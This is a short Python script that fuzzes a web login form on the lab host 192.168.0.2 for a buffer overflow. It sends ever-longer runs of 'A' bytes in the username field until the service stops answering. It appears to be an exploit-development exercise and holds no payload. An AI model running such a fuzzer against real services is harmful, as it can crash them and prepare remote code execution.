#! /usr/bin/python3
# POST /login HTTP/1.1
# Host: 192.168.0.2
# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 26
# Origin: http://192.168.0.2
# Connection: keep-alive
# Referer: http://192.168.0.2/login
# Upgrade-Insecure-Requests: 1
#
# username=bam&password=pass
import socket
import sys
from time import sleep

size = 500
while True:
    try:
        print(f"Try to fuzz with payload size {size}")
        buffer = b'A' * size
        content = b"username=" + buffer + b"&password=pass"
        request = "POST /login HTTP/1.1\r\n" \
                  "Host: 192.168.0.2\r\n" \
                  "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n" \
                  "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n" \
                  "Accept-Language: en-US,en;q=0.5\r\n" \
                  "Accept-Encoding: gzip, deflate\r\n" \
                  "Content-Type: application/x-www-form-urlencoded\r\n" \
                  "Origin: http://192.168.0.2\r\n" \
                  "Connection: keep-alive\r\n" \
                  "Referer: http://192.168.0.2/login\r\n" \
                  "Upgrade-Insecure-Requests: 1\r\n"
        request += "Content-Length: " + str(len(content)) + "\r\n"
        request += "\r\n"
        request = request.encode() + content

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.2", 80))
        s.send(request)

        size += 100
        sleep(5)
    except:
        print("Failed to connect!")
        sys.exit()
